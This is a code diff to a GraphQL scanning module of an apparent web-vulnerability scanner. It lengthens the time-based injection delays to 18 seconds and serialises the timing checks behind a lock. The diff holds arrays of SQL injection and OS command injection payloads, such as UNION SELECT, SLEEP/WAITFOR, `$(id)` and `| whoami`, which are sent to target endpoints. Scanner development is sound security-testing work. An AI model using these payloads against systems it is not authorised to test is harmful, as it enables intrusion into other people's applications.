@@ -7,6 +7,7 @@ import com.google.gson.*;
 import com.omnistrike.framework.CollaboratorManager;
 import com.omnistrike.framework.DeduplicationStore;
 import com.omnistrike.framework.FindingsStore;
+import com.omnistrike.framework.TimingLock;
 
 import com.omnistrike.model.*;
 
@@ -99,9 +100,9 @@ public class GraphqlTool implements ScanModule {
             {"1' AND '1'='2", "Boolean-based AND false"},
             {"' UNION SELECT NULL--", "UNION single column"},
             {"' UNION SELECT NULL,NULL--", "UNION two columns"},
-            {"'; WAITFOR DELAY '0:0:5'--", "MSSQL time-based"},
-            {"' AND SLEEP(5)--", "MySQL time-based"},
-            {"'; SELECT pg_sleep(5)--", "PostgreSQL time-based"},
+            {"'; WAITFOR DELAY '0:0:18'--", "MSSQL time-based"},
+            {"' AND SLEEP(18)--", "MySQL time-based"},
+            {"'; SELECT pg_sleep(18)--", "PostgreSQL time-based"},
             {"' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL error-based"},
             {"' AND extractvalue(1,concat(0x7e,version()))--", "MySQL error-based extractvalue"},
             {"' AND updatexml(1,concat(0x7e,version()),1)--", "MySQL error-based updatexml"},
@@ -123,8 +124,8 @@ public class GraphqlTool implements ScanModule {
             {"| id", "Pipe id (Unix)"},
             {"$(id)", "Subshell id (Unix)"},
             {"`id`", "Backtick id (Unix)"},
-            {"; sleep 5", "Semicolon sleep (Unix)"},
-            {"& ping -n 5 127.0.0.1 &", "Ping delay (Windows)"},
+            {"; sleep 18", "Semicolon sleep (Unix)"},
+            {"& ping -n 18 127.0.0.1 &", "Ping delay (Windows)"},
             {"| whoami", "Pipe whoami"},
             {"; ls /", "Semicolon ls (Unix)"},
     };
@@ -756,69 +757,24 @@ public class GraphqlTool implements ScanModule {
         String baselineRespBody = (baselineResult != null && baselineResult.response() != null)
                 ? baselineResult.response().bodyToString() : "";
 
+        // Pass 1: Non-time-based payloads (error-based, boolean-based, union-based)
         for (String[] payloadInfo : SQLI_PAYLOADS) {
             checkInterrupted();
             String payload = payloadInfo[0];
             String technique = payloadInfo[1];
 
+            // Skip time-based payloads in pass 1
+            if (technique.toLowerCase().contains("time")) continue;
+
             String query = buildQueryForArg(arg, payload);
             String body = new Gson().toJson(Map.of("query", query));
             HttpRequest req = buildGqlRequest(originalRequest, path, body);
-
-            long start = System.currentTimeMillis();
             HttpRequestResponse result = api.http().sendRequest(req);
-            long elapsed = System.currentTimeMillis() - start;
             perHostDelay();
 
             if (result == null || result.response() == null) continue;
             String respBody = result.response().bodyToString();
             if (respBody == null) continue;
-
-            // Check for time-based — require delay above baseline AND false-condition must NOT delay
-            if (technique.contains("time") && elapsed > 4500) {
-                // Step 1: measure fresh baseline
-                long measuredBaselineTime = 0;
-                try {
-                    long bstart = System.currentTimeMillis();
-                    api.http().sendRequest(buildGqlRequest(originalRequest, path,
-                            new Gson().toJson(Map.of("query", buildQueryForArg(arg, "test123")))));
-                    measuredBaselineTime = System.currentTimeMillis() - bstart;
-                } catch (Exception ignored) {}
-
-                if (elapsed > measuredBaselineTime + 4000) {
-                    // Step 2: false-condition verification — replace SLEEP(5) with SLEEP(0) or IF(1=2,SLEEP(5),0)
-                    String falsePayload = payload.replace("SLEEP(5)", "SLEEP(0)")
-                            .replace("sleep(5)", "sleep(0)")
-                            .replace("pg_sleep(5)", "pg_sleep(0)")
-                            .replace("DELAY '0:0:5'", "DELAY '0:0:0'");
-                    String falseQuery = buildQueryForArg(arg, falsePayload);
-                    String falseBody = new Gson().toJson(Map.of("query", falseQuery));
-                    HttpRequest falseReq = buildGqlRequest(originalRequest, path, falseBody);
-                    long fstart = System.currentTimeMillis();
-                    api.http().sendRequest(falseReq);
-                    long falseElapsed = System.currentTimeMillis() - fstart;
-                    perHostDelay();
-
-                    // False condition must NOT delay (within baseline + 2s tolerance)
-                    if (falseElapsed < measuredBaselineTime + 2000) {
-                        findingsStore.addFinding(Finding.builder(MODULE_ID,
-                                        "GraphQL SQL Injection (Time-Based) via " + arg.argName,
-                                        Severity.HIGH, Confidence.CERTAIN)
-                                .url(url)
-                                .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
-                                .evidence("Technique: " + technique + " | Payload: " + payload
-                                        + " | True condition: " + elapsed + "ms | False condition: "
-                                        + falseElapsed + "ms | Baseline: " + measuredBaselineTime + "ms")
-                                .description("Time-based SQL injection confirmed in GraphQL argument '" + arg.argName
-                                        + "'. True condition delayed " + (elapsed / 1000) + "s while false condition "
-                                        + "returned in " + falseElapsed + "ms.")
-                                .requestResponse(result)
-                                .payload(payload)
-                                .build());
-                        return;
-                    }
-                }
-            }
 
             // Check for error-based (SQL error strings in response)
             if (containsSqlError(respBody) && !containsSqlError(baselineRespBody)) {
@@ -837,6 +793,83 @@ public class GraphqlTool implements ScanModule {
                         .build());
                 return;
             }
+        }
+
+        // Pass 2: Time-based payloads (serialized via TimingLock)
+        try {
+            TimingLock.acquire();
+            for (String[] payloadInfo : SQLI_PAYLOADS) {
+                checkInterrupted();
+                String payload = payloadInfo[0];
+                String technique = payloadInfo[1];
+
+                // Only time-based payloads in pass 2
+                if (!technique.toLowerCase().contains("time")) continue;
+
+                String query = buildQueryForArg(arg, payload);
+                String body = new Gson().toJson(Map.of("query", query));
+                HttpRequest req = buildGqlRequest(originalRequest, path, body);
+
+                long start = System.currentTimeMillis();
+                HttpRequestResponse result = api.http().sendRequest(req);
+                long elapsed = System.currentTimeMillis() - start;
+                perHostDelay();
+
+                if (result == null || result.response() == null) continue;
+                String respBody = result.response().bodyToString();
+                if (respBody == null) continue;
+
+                // Check for time-based — require delay above baseline AND false-condition must NOT delay
+                if (elapsed > 14400) {
+                    // Step 1: measure fresh baseline
+                    long measuredBaselineTime = 0;
+                    try {
+                        long bstart = System.currentTimeMillis();
+                        api.http().sendRequest(buildGqlRequest(originalRequest, path,
+                                new Gson().toJson(Map.of("query", buildQueryForArg(arg, "test123")))));
+                        measuredBaselineTime = System.currentTimeMillis() - bstart;
+                    } catch (Exception ignored) {}
+
+                    if (elapsed > measuredBaselineTime + 14000) {
+                        // Step 2: false-condition verification — replace SLEEP(18) with SLEEP(0) etc.
+                        String falsePayload = payload.replace("SLEEP(18)", "SLEEP(0)")
+                                .replace("sleep(18)", "sleep(0)")
+                                .replace("pg_sleep(18)", "pg_sleep(0)")
+                                .replace("DELAY '0:0:18'", "DELAY '0:0:0'");
+                        String falseQuery = buildQueryForArg(arg, falsePayload);
+                        String falseBody = new Gson().toJson(Map.of("query", falseQuery));
+                        HttpRequest falseReq = buildGqlRequest(originalRequest, path, falseBody);
+                        long fstart = System.currentTimeMillis();
+                        api.http().sendRequest(falseReq);
+                        long falseElapsed = System.currentTimeMillis() - fstart;
+                        perHostDelay();
+
+                        // False condition must NOT delay (within baseline + 5s tolerance)
+                        if (falseElapsed < measuredBaselineTime + 5000) {
+                            findingsStore.addFinding(Finding.builder(MODULE_ID,
+                                            "GraphQL SQL Injection (Time-Based) via " + arg.argName,
+                                            Severity.HIGH, Confidence.CERTAIN)
+                                    .url(url)
+                                    .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
+                                    .evidence("Technique: " + technique + " | Payload: " + payload
+                                            + " | True condition: " + elapsed + "ms | False condition: "
+                                            + falseElapsed + "ms | Baseline: " + measuredBaselineTime + "ms")
+                                    .description("Time-based SQL injection confirmed in GraphQL argument '" + arg.argName
+                                            + "'. True condition delayed " + (elapsed / 1000) + "s while false condition "
+                                            + "returned in " + falseElapsed + "ms.")
+                                    .requestResponse(result)
+                                    .payload(payload)
+                                    .build());
+                            return;
+                        }
+                    }
+                }
+            }
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+            return;
+        } finally {
+            TimingLock.release();
         }
     }
 
@@ -897,18 +930,19 @@ public class GraphqlTool implements ScanModule {
         String baselineRespBody = (baselineResult != null && baselineResult.response() != null)
                 ? baselineResult.response().bodyToString() : "";
 
+        // Pass 1: Output-based payloads (skip time-based: sleep, ping -n)
         for (String[] payloadInfo : CMDI_PAYLOADS) {
             checkInterrupted();
             String payload = payloadInfo[0];
             String technique = payloadInfo[1];
 
+            // Skip time-based payloads in pass 1
+            if (payload.contains("sleep") || payload.contains("ping -n")) continue;
+
             String query = buildQueryForArg(arg, payload);
             String body = new Gson().toJson(Map.of("query", query));
             HttpRequest req = buildGqlRequest(originalRequest, path, body);
-
-            long start = System.currentTimeMillis();
             HttpRequestResponse result = api.http().sendRequest(req);
-            long elapsed = System.currentTimeMillis() - start;
             perHostDelay();
 
             if (result == null || result.response() == null) continue;
@@ -938,21 +972,55 @@ public class GraphqlTool implements ScanModule {
                         .build());
                 return;
             }
+        }
 
-            // Time-based (sleep 5)
-            if (payload.contains("sleep 5") && elapsed > 4500) {
-                findingsStore.addFinding(Finding.builder(MODULE_ID,
-                                "GraphQL OS Command Injection (Time-Based) via " + arg.argName,
-                                Severity.HIGH, Confidence.FIRM)
-                        .url(url)
-                        .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
-                        .evidence("Technique: " + technique + " | Response time: " + elapsed + "ms")
-                        .description("Time-based command injection detected in GraphQL argument '" + arg.argName + "'.")
-                        .requestResponse(result)
-                        .payload(payload)
-                        .build());
-                return;
+        // Pass 2: Time-based payloads (serialized via TimingLock)
+        try {
+            TimingLock.acquire();
+            for (String[] payloadInfo : CMDI_PAYLOADS) {
+                checkInterrupted();
+                String payload = payloadInfo[0];
+                String technique = payloadInfo[1];
+
+                // Only time-based payloads in pass 2
+                if (!payload.contains("sleep") && !payload.contains("ping -n")) continue;
+
+                String query = buildQueryForArg(arg, payload);
+                String body = new Gson().toJson(Map.of("query", query));
+                HttpRequest req = buildGqlRequest(originalRequest, path, body);
+
+                long start = System.currentTimeMillis();
+                HttpRequestResponse result = api.http().sendRequest(req);
+                long elapsed = System.currentTimeMillis() - start;
+                perHostDelay();
+
+                if (result == null || result.response() == null) continue;
+                String respBody = result.response().bodyToString();
+                if (respBody == null) continue;
+
+                // Skip error responses — servers echo input in error pages
+                if (result.response().statusCode() >= 400) continue;
+
+                // Time-based detection
+                if (elapsed > 14400) {
+                    findingsStore.addFinding(Finding.builder(MODULE_ID,
+                                    "GraphQL OS Command Injection (Time-Based) via " + arg.argName,
+                                    Severity.HIGH, Confidence.FIRM)
+                            .url(url)
+                            .parameter(arg.parentType + "." + arg.fieldName + "." + arg.argName)
+                            .evidence("Technique: " + technique + " | Response time: " + elapsed + "ms")
+                            .description("Time-based command injection detected in GraphQL argument '" + arg.argName + "'.")
+                            .requestResponse(result)
+                            .payload(payload)
+                            .build());
+                    return;
+                }
             }
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+            return;
+        } finally {
+            TimingLock.release();
         }
     }
 
